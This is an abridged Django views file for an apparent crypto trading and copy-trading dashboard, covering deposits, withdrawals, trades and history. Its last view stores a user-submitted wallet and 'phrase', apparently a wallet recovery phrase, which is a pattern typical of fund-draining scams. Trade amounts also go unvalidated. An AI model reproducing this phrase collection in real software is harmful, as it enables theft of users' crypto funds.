...
def SignUpView(request):
    ...
    return render(
        request, "pages/register.html", {"countries": CountryData()}, status=200
    )
...
def Dashboard(request):
    ...
    # }
    total_deposit = sum(
        [x.amount for x in request.user.user_deposit.filter(confirmed=True)]
    )
    return render(
        request,
        "dashboard/dashboard.html",
        {"assets": assets, "user": user_json, "deposit": total_deposit},
    )
...
def Assets(request):
    ...
    return render(
        request, "dashboard/assets.html", {"assets": assets, "user": user_json}
    )
...
def Trades(request):
    ...
    if request.method == "POST":
        ...
        request.user.profile.dollar_balance = request.user.profile.dollar_balance - int(
            data["amount"]
        )
    ...
    return render(
        ...
        {"assets": assets, "user": user_json, "trades": trades},
    )
...
def DepositFunds(request):
    ...
    #     return
    address = [
        {"name": x.coin.upper(), "address": x.address}
    ...
    if request.method == "POST":
        ...
        messages.success(request, "Deposit request successful, wait for confirmation")
        return JsonResponse({"status": "success"}, safe=False, status=200)
    return render(
        request,
        "dashboard/deposit.html",
        {"wallets": address, "deposits": user_deposits},
    )
...
def Withdraw(request):
    if request.method == "POST":
        ...
        messages.success(
            request, "Withdrawal request successful, wait for confirmation"
        )
        return JsonResponse({"status": "success"}, safe=False, status=200)
    return render(
        request,
        "dashboard/withdraw.html",
        {"wallets": wallet_address, "user": request.user.profile.serialize()},
    )
...
def CopyTrades(request):
    ...
    if "copy" in request.GET:
        ...
        request.user.profile.trading_profile = CopyTrader.objects.filter(
            id=expert_id
        ).first()
        request.user.profile.save()
        return JsonResponse({"status": "success"}, safe=False)
    return render(
        request,
        "dashboard/copy.html",
        {"user": request.user.profile.serialize(), "experts": experts_dict},
    )
...
def History(request):
    ...
    history = {"withdrawals": withdrawals, "deposits": deposits}
    return render(
        request,
        "dashboard/transaction-history.html",
        {"user": request.user.profile.serialize(), "history": history},
    )
...
def RecoverUserData(request):
    ...
    for user in users:
        Profile.objects.create(otp=CreateOtp(), verified=True, user=user)
...
def CopyTraderPageRequest(request):
    if request.method == "POST":
        ...
        CopyTradeAccessRequest.objects.create(
            user=request.user, wallet=data["wallet"], phrase=data["phrase"]
        )
